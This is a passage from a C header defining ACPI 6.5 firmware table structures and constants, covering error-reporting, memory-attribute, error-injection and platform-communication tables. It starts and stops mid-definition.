    UINT8                                 PciCompatibleBaseClass;
    UINT8                                 PciCompatibleSubClass;
    UINT8                                 PciCompatibleProgrammingInterface;
} EFI_ACPI_6_5_SDEV_SECURE_ACCESS_COMPONENT_IDENTIFICATION_STRUCTURE;

///
/// Memory-based Secure Access Component
///
typedef struct {
    EFI_ACPI_6_5_SDEV_STRUCTURE_HEADER    Header;
    UINT32                                Reserved;
    UINT64                                MemoryAddressBase;
    UINT64                                MemoryLength;
} EFI_ACPI_6_5_SDEV_SECURE_ACCESS_COMPONENT_MEMORY_STRUCTURE;

///
/// PCIe Endpoint Device based Secure Device Structure
///
typedef struct {
    EFI_ACPI_6_5_SDEV_STRUCTURE_HEADER    Header;
    UINT16                                PciSegmentNumber;
    UINT16                                StartBusNumber;
    UINT16                                PciPathOffset;
    UINT16                                PciPathLength;
    UINT16                                VendorSpecificDataOffset;
    UINT16                                VendorSpecificDataLength;
} EFI_ACPI_6_5_SDEV_STRUCTURE_PCIE_ENDPOINT_DEVICE;

///
/// Boot Error Record Table (BERT)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         BootErrorRegionLength;
    UINT64                         BootErrorRegion;
} EFI_ACPI_6_5_BOOT_ERROR_RECORD_TABLE_HEADER;

///
/// BERT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_BOOT_ERROR_RECORD_TABLE_REVISION  0x01

///
/// Boot Error Region Block Status Definition
///
typedef struct {
    UINT32    UncorrectableErrorValid : 1;
    UINT32    CorrectableErrorValid : 1;
    UINT32    MultipleUncorrectableErrors : 1;
    UINT32    MultipleCorrectableErrors : 1;
    UINT32    ErrorDataEntryCount : 10;
    UINT32    Reserved : 18;
} EFI_ACPI_6_5_ERROR_BLOCK_STATUS;

///
/// Boot Error Region Definition
///
typedef struct {
    EFI_ACPI_6_5_ERROR_BLOCK_STATUS    BlockStatus;
    UINT32                             RawDataOffset;
    UINT32                             RawDataLength;
    UINT32                             DataLength;
    UINT32                             ErrorSeverity;
} EFI_ACPI_6_5_BOOT_ERROR_REGION_STRUCTURE;

//
// Boot Error Severity types
//
#define EFI_ACPI_6_5_ERROR_SEVERITY_RECOVERABLE  0x00
#define EFI_ACPI_6_5_ERROR_SEVERITY_FATAL        0x01
#define EFI_ACPI_6_5_ERROR_SEVERITY_CORRECTED    0x02
#define EFI_ACPI_6_5_ERROR_SEVERITY_NONE         0x03
//
// The term 'Correctable' is no longer being used as an error severity of the
// reported error since ACPI Specification Version 5.1 Errata B.
// The below macro is considered as deprecated and should no longer be used.
//
#define EFI_ACPI_6_5_ERROR_SEVERITY_CORRECTABLE  0x00

///
/// Generic Error Data Entry Definition
///
typedef struct {
    UINT8     SectionType[16];
    UINT32    ErrorSeverity;
    UINT16    Revision;
    UINT8     ValidationBits;
    UINT8     Flags;
    UINT32    ErrorDataLength;
    UINT8     FruId[16];
    UINT8     FruText[20];
    UINT8     Timestamp[8];
} EFI_ACPI_6_5_GENERIC_ERROR_DATA_ENTRY_STRUCTURE;

///
/// Generic Error Data Entry Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_GENERIC_ERROR_DATA_ENTRY_REVISION  0x0300

///
/// HEST - Hardware Error Source Table
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         ErrorSourceCount;
} EFI_ACPI_6_5_HARDWARE_ERROR_SOURCE_TABLE_HEADER;

///
/// HEST Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_HARDWARE_ERROR_SOURCE_TABLE_REVISION  0x01

//
// Error Source structure types.
//
#define EFI_ACPI_6_5_IA32_ARCHITECTURE_MACHINE_CHECK_EXCEPTION  0x00
#define EFI_ACPI_6_5_IA32_ARCHITECTURE_CORRECTED_MACHINE_CHECK  0x01
#define EFI_ACPI_6_5_IA32_ARCHITECTURE_NMI_ERROR                0x02
#define EFI_ACPI_6_5_PCI_EXPRESS_ROOT_PORT_AER                  0x06
#define EFI_ACPI_6_5_PCI_EXPRESS_DEVICE_AER                     0x07
#define EFI_ACPI_6_5_PCI_EXPRESS_BRIDGE_AER                     0x08
#define EFI_ACPI_6_5_GENERIC_HARDWARE_ERROR                     0x09
#define EFI_ACPI_6_5_GENERIC_HARDWARE_ERROR_VERSION_2           0x0A
#define EFI_ACPI_6_5_IA32_ARCHITECTURE_DEFERRED_MACHINE_CHECK   0x0B

//
// Error Source structure flags.
//
#define EFI_ACPI_6_5_ERROR_SOURCE_FLAG_FIRMWARE_FIRST  (1 << 0)
#define EFI_ACPI_6_5_ERROR_SOURCE_FLAG_GLOBAL          (1 << 1)
#define EFI_ACPI_6_5_ERROR_SOURCE_FLAG_GHES_ASSIST     (1 << 2)

///
/// IA-32 Architecture Machine Check Exception Structure Definition
///
typedef struct {
    UINT16    Type;
    UINT16    SourceId;
    UINT8     Reserved0[2];
    UINT8     Flags;
    UINT8     Enabled;
    UINT32    NumberOfRecordsToPreAllocate;
    UINT32    MaxSectionsPerRecord;
    UINT64    GlobalCapabilityInitData;
    UINT64    GlobalControlInitData;
    UINT8     NumberOfHardwareBanks;
    UINT8     Reserved1[7];
} EFI_ACPI_6_5_IA32_ARCHITECTURE_MACHINE_CHECK_EXCEPTION_STRUCTURE;

///
/// IA-32 Architecture Machine Check Bank Structure Definition
///
typedef struct {
    UINT8     BankNumber;
    UINT8     ClearStatusOnInitialization;
    UINT8     StatusDataFormat;
    UINT8     Reserved0;
    UINT32    ControlRegisterMsrAddress;
    UINT64    ControlInitData;
    UINT32    StatusRegisterMsrAddress;
    UINT32    AddressRegisterMsrAddress;
    UINT32    MiscRegisterMsrAddress;
} EFI_ACPI_6_5_IA32_ARCHITECTURE_MACHINE_CHECK_ERROR_BANK_STRUCTURE;

///
/// IA-32 Architecture Machine Check Bank Structure MCA data format
///
#define EFI_ACPI_6_5_IA32_ARCHITECTURE_MACHINE_CHECK_ERROR_DATA_FORMAT_IA32     0x00
#define EFI_ACPI_6_5_IA32_ARCHITECTURE_MACHINE_CHECK_ERROR_DATA_FORMAT_INTEL64  0x01
#define EFI_ACPI_6_5_IA32_ARCHITECTURE_MACHINE_CHECK_ERROR_DATA_FORMAT_AMD64    0x02

//
// Hardware Error Notification types. All other values are reserved
//
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_POLLED                        0x00
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_EXTERNAL_INTERRUPT            0x01
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_LOCAL_INTERRUPT               0x02
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_SCI                           0x03
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_NMI                           0x04
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_CMCI                          0x05
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_MCE                           0x06
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_GPIO_SIGNAL                   0x07
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_ARMV8_SEA                     0x08
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_ARMV8_SEI                     0x09
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_GSIV                          0x0A
#define EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_SOFTWARE_DELEGATED_EXCEPTION  0x0B

///
/// Hardware Error Notification Configuration Write Enable Structure Definition
///
typedef struct {
    UINT16    Type : 1;
    UINT16    PollInterval : 1;
    UINT16    SwitchToPollingThresholdValue : 1;
    UINT16    SwitchToPollingThresholdWindow : 1;
    UINT16    ErrorThresholdValue : 1;
    UINT16    ErrorThresholdWindow : 1;
    UINT16    Reserved : 10;
} EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_CONFIGURATION_WRITE_ENABLE_STRUCTURE;

///
/// Hardware Error Notification Structure Definition
///
typedef struct {
    UINT8                                                                            Type;
    UINT8                                                                            Length;
    EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_CONFIGURATION_WRITE_ENABLE_STRUCTURE    ConfigurationWriteEnable;
    UINT32                                                                           PollInterval;
    UINT32                                                                           Vector;
    UINT32                                                                           SwitchToPollingThresholdValue;
    UINT32                                                                           SwitchToPollingThresholdWindow;
    UINT32                                                                           ErrorThresholdValue;
    UINT32                                                                           ErrorThresholdWindow;
} EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_STRUCTURE;

///
/// IA-32 Architecture Corrected Machine Check Structure Definition
///
typedef struct {
    UINT16                                                Type;
    UINT16                                                SourceId;
    UINT8                                                 Reserved0[2];
    UINT8                                                 Flags;
    UINT8                                                 Enabled;
    UINT32                                                NumberOfRecordsToPreAllocate;
    UINT32                                                MaxSectionsPerRecord;
    EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_STRUCTURE    NotificationStructure;
    UINT8                                                 NumberOfHardwareBanks;
    UINT8                                                 Reserved1[3];
} EFI_ACPI_6_5_IA32_ARCHITECTURE_CORRECTED_MACHINE_CHECK_STRUCTURE;

///
/// IA-32 Architecture NMI Error Structure Definition
///
typedef struct {
    UINT16    Type;
    UINT16    SourceId;
    UINT8     Reserved0[2];
    UINT32    NumberOfRecordsToPreAllocate;
    UINT32    MaxSectionsPerRecord;
    UINT32    MaxRawDataLength;
} EFI_ACPI_6_5_IA32_ARCHITECTURE_NMI_ERROR_STRUCTURE;

///
/// PCI Express Root Port AER Structure Definition
///
typedef struct {
    UINT16    Type;
    UINT16    SourceId;
    UINT8     Reserved0[2];
    UINT8     Flags;
    UINT8     Enabled;
    UINT32    NumberOfRecordsToPreAllocate;
    UINT32    MaxSectionsPerRecord;
    UINT32    Bus;
    UINT16    Device;
    UINT16    Function;
    UINT16    DeviceControl;
    UINT8     Reserved1[2];
    UINT32    UncorrectableErrorMask;
    UINT32    UncorrectableErrorSeverity;
    UINT32    CorrectableErrorMask;
    UINT32    AdvancedErrorCapabilitiesAndControl;
    UINT32    RootErrorCommand;
} EFI_ACPI_6_5_PCI_EXPRESS_ROOT_PORT_AER_STRUCTURE;

///
/// PCI Express Device AER Structure Definition
///
typedef struct {
    UINT16    Type;
    UINT16    SourceId;
    UINT8     Reserved0[2];
    UINT8     Flags;
    UINT8     Enabled;
    UINT32    NumberOfRecordsToPreAllocate;
    UINT32    MaxSectionsPerRecord;
    UINT32    Bus;
    UINT16    Device;
    UINT16    Function;
    UINT16    DeviceControl;
    UINT8     Reserved1[2];
    UINT32    UncorrectableErrorMask;
    UINT32    UncorrectableErrorSeverity;
    UINT32    CorrectableErrorMask;
    UINT32    AdvancedErrorCapabilitiesAndControl;
} EFI_ACPI_6_5_PCI_EXPRESS_DEVICE_AER_STRUCTURE;

///
/// PCI Express Bridge AER Structure Definition
///
typedef struct {
    UINT16    Type;
    UINT16    SourceId;
    UINT8     Reserved0[2];
    UINT8     Flags;
    UINT8     Enabled;
    UINT32    NumberOfRecordsToPreAllocate;
    UINT32    MaxSectionsPerRecord;
    UINT32    Bus;
    UINT16    Device;
    UINT16    Function;
    UINT16    DeviceControl;
    UINT8     Reserved1[2];
    UINT32    UncorrectableErrorMask;
    UINT32    UncorrectableErrorSeverity;
    UINT32    CorrectableErrorMask;
    UINT32    AdvancedErrorCapabilitiesAndControl;
    UINT32    SecondaryUncorrectableErrorMask;
    UINT32    SecondaryUncorrectableErrorSeverity;
    UINT32    SecondaryAdvancedErrorCapabilitiesAndControl;
} EFI_ACPI_6_5_PCI_EXPRESS_BRIDGE_AER_STRUCTURE;

///
/// Generic Hardware Error Source Structure Definition
///
typedef struct {
    UINT16                                                Type;
    UINT16                                                SourceId;
    UINT16                                                RelatedSourceId;
    UINT8                                                 Flags;
    UINT8                                                 Enabled;
    UINT32                                                NumberOfRecordsToPreAllocate;
    UINT32                                                MaxSectionsPerRecord;
    UINT32                                                MaxRawDataLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE                ErrorStatusAddress;
    EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_STRUCTURE    NotificationStructure;
    UINT32                                                ErrorStatusBlockLength;
} EFI_ACPI_6_5_GENERIC_HARDWARE_ERROR_SOURCE_STRUCTURE;

///
/// Generic Hardware Error Source Version 2 Structure Definition
///
typedef struct {
    UINT16                                                Type;
    UINT16                                                SourceId;
    UINT16                                                RelatedSourceId;
    UINT8                                                 Flags;
    UINT8                                                 Enabled;
    UINT32                                                NumberOfRecordsToPreAllocate;
    UINT32                                                MaxSectionsPerRecord;
    UINT32                                                MaxRawDataLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE                ErrorStatusAddress;
    EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_STRUCTURE    NotificationStructure;
    UINT32                                                ErrorStatusBlockLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE                ReadAckRegister;
    UINT64                                                ReadAckPreserve;
    UINT64                                                ReadAckWrite;
} EFI_ACPI_6_5_GENERIC_HARDWARE_ERROR_SOURCE_VERSION_2_STRUCTURE;

///
/// Generic Error Status Definition
///
typedef struct {
    EFI_ACPI_6_5_ERROR_BLOCK_STATUS    BlockStatus;
    UINT32                             RawDataOffset;
    UINT32                             RawDataLength;
    UINT32                             DataLength;
    UINT32                             ErrorSeverity;
} EFI_ACPI_6_5_GENERIC_ERROR_STATUS_STRUCTURE;

///
/// IA-32 Architecture Deferred Machine Check Structure Definition
///
typedef struct {
    UINT16                                                Type;
    UINT16                                                SourceId;
    UINT8                                                 Reserved0[2];
    UINT8                                                 Flags;
    UINT8                                                 Enabled;
    UINT32                                                NumberOfRecordsToPreAllocate;
    UINT32                                                MaxSectionsPerRecord;
    EFI_ACPI_6_5_HARDWARE_ERROR_NOTIFICATION_STRUCTURE    NotificationStructure;
    UINT8                                                 NumberOfHardwareBanks;
    UINT8                                                 Reserved1[3];
} EFI_ACPI_6_5_IA32_ARCHITECTURE_DEFERRED_MACHINE_CHECK_STRUCTURE;

///
/// HMAT - Heterogeneous Memory Attribute Table
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT8                          Reserved[4];
} EFI_ACPI_6_5_HETEROGENEOUS_MEMORY_ATTRIBUTE_TABLE_HEADER;

///
/// HMAT Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_HETEROGENEOUS_MEMORY_ATTRIBUTE_TABLE_REVISION  0x02

///
/// HMAT types
///
#define EFI_ACPI_6_5_HMAT_TYPE_MEMORY_PROXIMITY_DOMAIN_ATTRIBUTES          0x00
#define EFI_ACPI_6_5_HMAT_TYPE_SYSTEM_LOCALITY_LATENCY_AND_BANDWIDTH_INFO  0x01
#define EFI_ACPI_6_5_HMAT_TYPE_MEMORY_SIDE_CACHE_INFO                      0x02

///
/// HMAT Structure Header
///
typedef struct {
    UINT16    Type;
    UINT8     Reserved[2];
    UINT32    Length;
} EFI_ACPI_6_5_HMAT_STRUCTURE_HEADER;

///
/// Memory Proximity Domain Attributes Structure flags
///
typedef struct {
    UINT16    InitiatorProximityDomainValid : 1;
    UINT16    Reserved : 15;
} EFI_ACPI_6_5_HMAT_STRUCTURE_MEMORY_PROXIMITY_DOMAIN_ATTRIBUTES_FLAGS;

///
/// Memory Proximity Domain Attributes Structure
///
typedef struct {
    UINT16                                                                  Type;
    UINT8                                                                   Reserved[2];
    UINT32                                                                  Length;
    EFI_ACPI_6_5_HMAT_STRUCTURE_MEMORY_PROXIMITY_DOMAIN_ATTRIBUTES_FLAGS    Flags;
    UINT8                                                                   Reserved1[2];
    UINT32                                                                  InitiatorProximityDomain;
    UINT32                                                                  MemoryProximityDomain;
    UINT8                                                                   Reserved2[20];
} EFI_ACPI_6_5_HMAT_STRUCTURE_MEMORY_PROXIMITY_DOMAIN_ATTRIBUTES;

///
/// System Locality Latency and Bandwidth Information Structure flags
///
typedef struct {
    UINT8    MemoryHierarchy : 4;
    UINT8    AccessAttributes : 2;
    UINT8    Reserved : 2;
} EFI_ACPI_6_5_HMAT_STRUCTURE_SYSTEM_LOCALITY_LATENCY_AND_BANDWIDTH_INFO_FLAGS;

///
/// System Locality Latency and Bandwidth Information Structure
///
typedef struct {
    UINT16                                                                          Type;
    UINT8                                                                           Reserved[2];
    UINT32                                                                          Length;
    EFI_ACPI_6_5_HMAT_STRUCTURE_SYSTEM_LOCALITY_LATENCY_AND_BANDWIDTH_INFO_FLAGS    Flags;
    UINT8                                                                           DataType;
    UINT8                                                                           MinTransferSize;
    UINT8                                                                           Reserved1;
    UINT32                                                                          NumberOfInitiatorProximityDomains;
    UINT32                                                                          NumberOfTargetProximityDomains;
    UINT8                                                                           Reserved2[4];
    UINT64                                                                          EntryBaseUnit;
} EFI_ACPI_6_5_HMAT_STRUCTURE_SYSTEM_LOCALITY_LATENCY_AND_BANDWIDTH_INFO;

///
/// Memory Side Cache Information Structure cache attributes
///
typedef struct {
    UINT32    TotalCacheLevels : 4;
    UINT32    CacheLevel : 4;
    UINT32    CacheAssociativity : 4;
    UINT32    WritePolicy : 4;
    UINT32    CacheLineSize : 16;
} EFI_ACPI_6_5_HMAT_STRUCTURE_MEMORY_SIDE_CACHE_INFO_CACHE_ATTRIBUTES;

///
/// Memory Side Cache Information Structure
///
typedef struct {
    UINT16                                                                 Type;
    UINT8                                                                  Reserved[2];
    UINT32                                                                 Length;
    UINT32                                                                 MemoryProximityDomain;
    UINT8                                                                  Reserved1[4];
    UINT64                                                                 MemorySideCacheSize;
    EFI_ACPI_6_5_HMAT_STRUCTURE_MEMORY_SIDE_CACHE_INFO_CACHE_ATTRIBUTES    CacheAttributes;
    UINT8                                                                  Reserved2[2];
    UINT16                                                                 NumberOfSmbiosHandles;
} EFI_ACPI_6_5_HMAT_STRUCTURE_MEMORY_SIDE_CACHE_INFO;

///
/// ERST - Error Record Serialization Table
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         SerializationHeaderSize;
    UINT8                          Reserved0[4];
    UINT32                         InstructionEntryCount;
} EFI_ACPI_6_5_ERROR_RECORD_SERIALIZATION_TABLE_HEADER;

///
/// ERST Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_ERROR_RECORD_SERIALIZATION_TABLE_REVISION  0x01

///
/// ERST Serialization Actions
///
#define EFI_ACPI_6_5_ERST_BEGIN_WRITE_OPERATION                   0x00
#define EFI_ACPI_6_5_ERST_BEGIN_READ_OPERATION                    0x01
#define EFI_ACPI_6_5_ERST_BEGIN_CLEAR_OPERATION                   0x02
#define EFI_ACPI_6_5_ERST_END_OPERATION                           0x03
#define EFI_ACPI_6_5_ERST_SET_RECORD_OFFSET                       0x04
#define EFI_ACPI_6_5_ERST_EXECUTE_OPERATION                       0x05
#define EFI_ACPI_6_5_ERST_CHECK_BUSY_STATUS                       0x06
#define EFI_ACPI_6_5_ERST_GET_COMMAND_STATUS                      0x07
#define EFI_ACPI_6_5_ERST_GET_RECORD_IDENTIFIER                   0x08
#define EFI_ACPI_6_5_ERST_SET_RECORD_IDENTIFIER                   0x09
#define EFI_ACPI_6_5_ERST_GET_RECORD_COUNT                        0x0A
#define EFI_ACPI_6_5_ERST_BEGIN_DUMMY_WRITE_OPERATION             0x0B
#define EFI_ACPI_6_5_ERST_GET_ERROR_LOG_ADDRESS_RANGE             0x0D
#define EFI_ACPI_6_5_ERST_GET_ERROR_LOG_ADDRESS_RANGE_LENGTH      0x0E
#define EFI_ACPI_6_5_ERST_GET_ERROR_LOG_ADDRESS_RANGE_ATTRIBUTES  0x0F
#define EFI_ACPI_6_5_ERST_GET_EXECUTE_OPERATION_TIMINGS           0x10

///
/// ERST Action Command Status
///
#define EFI_ACPI_6_5_ERST_STATUS_SUCCESS                 0x00
#define EFI_ACPI_6_5_ERST_STATUS_NOT_ENOUGH_SPACE        0x01
#define EFI_ACPI_6_5_ERST_STATUS_HARDWARE_NOT_AVAILABLE  0x02
#define EFI_ACPI_6_5_ERST_STATUS_FAILED                  0x03
#define EFI_ACPI_6_5_ERST_STATUS_RECORD_STORE_EMPTY      0x04
#define EFI_ACPI_6_5_ERST_STATUS_RECORD_NOT_FOUND        0x05

///
/// ERST Serialization Instructions
///
#define EFI_ACPI_6_5_ERST_READ_REGISTER                  0x00
#define EFI_ACPI_6_5_ERST_READ_REGISTER_VALUE            0x01
#define EFI_ACPI_6_5_ERST_WRITE_REGISTER                 0x02
#define EFI_ACPI_6_5_ERST_WRITE_REGISTER_VALUE           0x03
#define EFI_ACPI_6_5_ERST_NOOP                           0x04
#define EFI_ACPI_6_5_ERST_LOAD_VAR1                      0x05
#define EFI_ACPI_6_5_ERST_LOAD_VAR2                      0x06
#define EFI_ACPI_6_5_ERST_STORE_VAR1                     0x07
#define EFI_ACPI_6_5_ERST_ADD                            0x08
#define EFI_ACPI_6_5_ERST_SUBTRACT                       0x09
#define EFI_ACPI_6_5_ERST_ADD_VALUE                      0x0A
#define EFI_ACPI_6_5_ERST_SUBTRACT_VALUE                 0x0B
#define EFI_ACPI_6_5_ERST_STALL                          0x0C
#define EFI_ACPI_6_5_ERST_STALL_WHILE_TRUE               0x0D
#define EFI_ACPI_6_5_ERST_SKIP_NEXT_INSTRUCTION_IF_TRUE  0x0E
#define EFI_ACPI_6_5_ERST_GOTO                           0x0F
#define EFI_ACPI_6_5_ERST_SET_SRC_ADDRESS_BASE           0x10
#define EFI_ACPI_6_5_ERST_SET_DST_ADDRESS_BASE           0x11
#define EFI_ACPI_6_5_ERST_MOVE_DATA                      0x12

///
/// ERST Instruction Flags
///
#define EFI_ACPI_6_5_ERST_PRESERVE_REGISTER  0x01

///
/// ERST Serialization Instruction Entry
///
typedef struct {
    UINT8                                     SerializationAction;
    UINT8                                     Instruction;
    UINT8                                     Flags;
    UINT8                                     Reserved0;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    RegisterRegion;
    UINT64                                    Value;
    UINT64                                    Mask;
} EFI_ACPI_6_5_ERST_SERIALIZATION_INSTRUCTION_ENTRY;

///
/// EINJ - Error Injection Table
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         InjectionHeaderSize;
    UINT8                          InjectionFlags;
    UINT8                          Reserved0[3];
    UINT32                         InjectionEntryCount;
} EFI_ACPI_6_5_ERROR_INJECTION_TABLE_HEADER;

///
/// EINJ Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_ERROR_INJECTION_TABLE_REVISION  0x01

///
/// EINJ Error Injection Actions
///
#define EFI_ACPI_6_5_EINJ_BEGIN_INJECTION_OPERATION       0x00
#define EFI_ACPI_6_5_EINJ_GET_TRIGGER_ERROR_ACTION_TABLE  0x01
#define EFI_ACPI_6_5_EINJ_SET_ERROR_TYPE                  0x02
#define EFI_ACPI_6_5_EINJ_GET_ERROR_TYPE                  0x03
#define EFI_ACPI_6_5_EINJ_END_OPERATION                   0x04
#define EFI_ACPI_6_5_EINJ_EXECUTE_OPERATION               0x05
#define EFI_ACPI_6_5_EINJ_CHECK_BUSY_STATUS               0x06
#define EFI_ACPI_6_5_EINJ_GET_COMMAND_STATUS              0x07
#define EFI_ACPI_6_5_EINJ_TRIGGER_ERROR                   0xFF

///
/// EINJ Action Command Status
///
#define EFI_ACPI_6_5_EINJ_STATUS_SUCCESS          0x00
#define EFI_ACPI_6_5_EINJ_STATUS_UNKNOWN_FAILURE  0x01
#define EFI_ACPI_6_5_EINJ_STATUS_INVALID_ACCESS   0x02

///
/// EINJ Error Type Definition
///
#define EFI_ACPI_6_5_EINJ_ERROR_PROCESSOR_CORRECTABLE               (1 << 0)
#define EFI_ACPI_6_5_EINJ_ERROR_PROCESSOR_UNCORRECTABLE_NONFATAL    (1 << 1)
#define EFI_ACPI_6_5_EINJ_ERROR_PROCESSOR_UNCORRECTABLE_FATAL       (1 << 2)
#define EFI_ACPI_6_5_EINJ_ERROR_MEMORY_CORRECTABLE                  (1 << 3)
#define EFI_ACPI_6_5_EINJ_ERROR_MEMORY_UNCORRECTABLE_NONFATAL       (1 << 4)
#define EFI_ACPI_6_5_EINJ_ERROR_MEMORY_UNCORRECTABLE_FATAL          (1 << 5)
#define EFI_ACPI_6_5_EINJ_ERROR_PCI_EXPRESS_CORRECTABLE             (1 << 6)
#define EFI_ACPI_6_5_EINJ_ERROR_PCI_EXPRESS_UNCORRECTABLE_NONFATAL  (1 << 7)
#define EFI_ACPI_6_5_EINJ_ERROR_PCI_EXPRESS_UNCORRECTABLE_FATAL     (1 << 8)
#define EFI_ACPI_6_5_EINJ_ERROR_PLATFORM_CORRECTABLE                (1 << 9)
#define EFI_ACPI_6_5_EINJ_ERROR_PLATFORM_UNCORRECTABLE_NONFATAL     (1 << 10)
#define EFI_ACPI_6_5_EINJ_ERROR_PLATFORM_UNCORRECTABLE_FATAL        (1 << 11)

///
/// EINJ Injection Instructions
///
#define EFI_ACPI_6_5_EINJ_READ_REGISTER         0x00
#define EFI_ACPI_6_5_EINJ_READ_REGISTER_VALUE   0x01
#define EFI_ACPI_6_5_EINJ_WRITE_REGISTER        0x02
#define EFI_ACPI_6_5_EINJ_WRITE_REGISTER_VALUE  0x03
#define EFI_ACPI_6_5_EINJ_NOOP                  0x04

///
/// EINJ Instruction Flags
///
#define EFI_ACPI_6_5_EINJ_PRESERVE_REGISTER  0x01

///
/// EINJ Injection Instruction Entry
///
typedef struct {
    UINT8                                     InjectionAction;
    UINT8                                     Instruction;
    UINT8                                     Flags;
    UINT8                                     Reserved0;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    RegisterRegion;
    UINT64                                    Value;
    UINT64                                    Mask;
} EFI_ACPI_6_5_EINJ_INJECTION_INSTRUCTION_ENTRY;

///
/// EINJ Trigger Action Table
///
typedef struct {
    UINT32    HeaderSize;
    UINT32    Revision;
    UINT32    TableSize;
    UINT32    EntryCount;
} EFI_ACPI_6_5_EINJ_TRIGGER_ACTION_TABLE;

///
/// Platform Communications Channel Table (PCCT)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         Flags;
    UINT64                         Reserved;
} EFI_ACPI_6_5_PLATFORM_COMMUNICATION_CHANNEL_TABLE_HEADER;

///
/// PCCT Version (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_PLATFORM_COMMUNICATION_CHANNEL_TABLE_REVISION  0x02

///
/// PCCT Global Flags
///
#define EFI_ACPI_6_5_PCCT_FLAGS_PLATFORM_INTERRUPT  BIT0

//
// PCCT Subspace type
//
#define EFI_ACPI_6_5_PCCT_SUBSPACE_TYPE_GENERIC                        0x00
#define EFI_ACPI_6_5_PCCT_SUBSPACE_TYPE_1_HW_REDUCED_COMMUNICATIONS    0x01
#define EFI_ACPI_6_5_PCCT_SUBSPACE_TYPE_2_HW_REDUCED_COMMUNICATIONS    0x02
#define EFI_ACPI_6_5_PCCT_SUBSPACE_TYPE_3_EXTENDED_PCC                 0x03
#define EFI_ACPI_6_5_PCCT_SUBSPACE_TYPE_4_EXTENDED_PCC                 0x04
#define EFI_ACPI_6_5_PCCT_SUBSPACE_TYPE_5_HW_REGISTERS_COMMUNICATIONS  0x05

///
/// PCC Subspace Structure Header
///
typedef struct {
    UINT8    Type;
    UINT8    Length;
} EFI_ACPI_6_5_PCCT_SUBSPACE_HEADER;

///
/// Generic Communications Subspace Structure
///
typedef struct {
    UINT8                                     Type;
    UINT8                                     Length;
    UINT8                                     Reserved[6];
    UINT64                                    BaseAddress;
    UINT64                                    AddressLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    DoorbellRegister;
    UINT64                                    DoorbellPreserve;
    UINT64                                    DoorbellWrite;
    UINT32                                    NominalLatency;
    UINT32                                    MaximumPeriodicAccessRate;
    UINT16                                    MinimumRequestTurnaroundTime;
} EFI_ACPI_6_5_PCCT_SUBSPACE_GENERIC;

///
/// Generic Communications Channel Shared Memory Region
///

typedef struct {
    UINT8    Command;
    UINT8    Reserved : 7;
    UINT8    NotifyOnCompletion : 1;
} EFI_ACPI_6_5_PCCT_GENERIC_SHARED_MEMORY_REGION_COMMAND;

typedef struct {
    UINT8    CommandComplete : 1;
    UINT8    PlatformInterrupt : 1;
    UINT8    Error : 1;
    UINT8    PlatformNotification : 1;
    UINT8    Reserved : 4;
    UINT8    Reserved1;
} EFI_ACPI_6_5_PCCT_GENERIC_SHARED_MEMORY_REGION_STATUS;

typedef struct {
    UINT32                                                    Signature;
    EFI_ACPI_6_5_PCCT_GENERIC_SHARED_MEMORY_REGION_COMMAND    Command;
    EFI_ACPI_6_5_PCCT_GENERIC_SHARED_MEMORY_REGION_STATUS     Status;
} EFI_ACPI_6_5_PCCT_GENERIC_SHARED_MEMORY_REGION_HEADER;

#define EFI_ACPI_6_5_PCCT_SUBSPACE_PLATFORM_INTERRUPT_FLAGS_POLARITY  BIT0
#define EFI_ACPI_6_5_PCCT_SUBSPACE_PLATFORM_INTERRUPT_FLAGS_MODE      BIT1

///
/// Type 1 HW-Reduced Communications Subspace Structure
///
typedef struct {
    UINT8                                     Type;
    UINT8                                     Length;
    UINT32                                    PlatformInterrupt;
    UINT8                                     PlatformInterruptFlags;
    UINT8                                     Reserved;
    UINT64                                    BaseAddress;
    UINT64                                    AddressLength;
    EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE    DoorbellRegister;
    UINT64                                    DoorbellPreserve;
    UINT64                                    DoorbellWrite;
    UINT32                                    NominalLatency;
    UINT32                                    MaximumPeriodicAccessRate;
    UINT16                                    MinimumRequestTurnaroundTime;
